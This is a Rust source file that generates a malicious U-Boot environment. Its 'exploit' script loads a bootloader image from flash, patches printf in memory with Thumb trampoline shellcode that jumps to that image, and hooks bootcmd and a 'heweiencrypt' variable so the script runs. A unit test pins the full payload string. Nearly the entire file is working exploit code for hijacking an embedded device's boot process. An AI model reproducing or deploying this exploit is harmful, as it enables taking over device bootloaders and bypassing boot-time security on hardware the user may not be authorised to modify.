use core::fmt::Write;
use heapless::String;

fn create_shellcode(jump_addr: u32) -> [u8; 8] {
    let mut buf = [0u8; 8];
    // Thumb trampoline
    buf[0..4].copy_from_slice(&[0x00, 0x48, 0x00, 0x47]);
    buf[4..8].copy_from_slice(&jump_addr.to_le_bytes());
    buf
}

fn create_shellcode_cmd<const N: usize>(load_addr: u32, jump_addr: u32) -> String<N> {
    let mut s: String<N> = String::new();
    let shcode = create_shellcode(jump_addr);

    for (i, byte) in shcode.iter().enumerate() {
        let _ = write!(s, "mw.b {:#010x} {:#04x};", load_addr + (i as u32), byte);
    }
    let _ = write!(s, "dcache flush;icache flush;printenv jump2;reset;");
    s
}

fn create_flash_load_cmd<const N: usize>(load_addr: u32, offset: u32, size: u32) -> String<N> {
    let mut s: String<N> = String::new();
    let _ = write!(s, "sf probe 0;sf read {:#010x} {:#010x} {:#010x};", load_addr, offset, size);
    s
}

fn create_exploit_cmd<const N: usize>(uboot_load_addr: u32, uboot_flash_offset: u32, uboot_flash_size: u32, printf_addr: u32) -> String<N> {
    let mut s = create_flash_load_cmd::<N>(uboot_load_addr, uboot_flash_offset, uboot_flash_size);
    let shellcode_cmd = create_shellcode_cmd::<N>(printf_addr, uboot_load_addr);
    let _ = write!(s, "{}", shellcode_cmd);
    s
}

pub fn create_env<const N: usize>(uboot_load_addr: u32, uboot_flash_offset: u32, uboot_flash_size: u32, printf_addr: u32) -> String<N> {
    let exploit = create_exploit_cmd::<N>(uboot_load_addr, uboot_flash_offset, uboot_flash_size, printf_addr);
    let mut s: String<N> = String::new();
    let _ = write!(s, "bootcmd=run exploit;\0heweiencrypt=run exploit;\0exploit={}\0\0", exploit);
    s
}

#[test]
fn test() {
    let env = create_env::<1024>(0x12345678, 0x12341234, 0x11223344, 0x44556688);
    assert_eq!(
        env,
        "bootcmd=run exploit;\0heweiencrypt=run exploit;\0exploit=sf probe 0;sf read 0x12345678 0x12341234 0x11223344;mw.b 0x44556688 0x00;mw.b 0x44556689 0x48;mw.b 0x4455668a 0x00;mw.b 0x4455668b 0x47;mw.b 0x4455668c 0x78;mw.b 0x4455668d 0x56;mw.b 0x4455668e 0x34;mw.b 0x4455668f 0x12;dcache flush;icache flush;printenv jump2;reset;\0\0"
    );
}
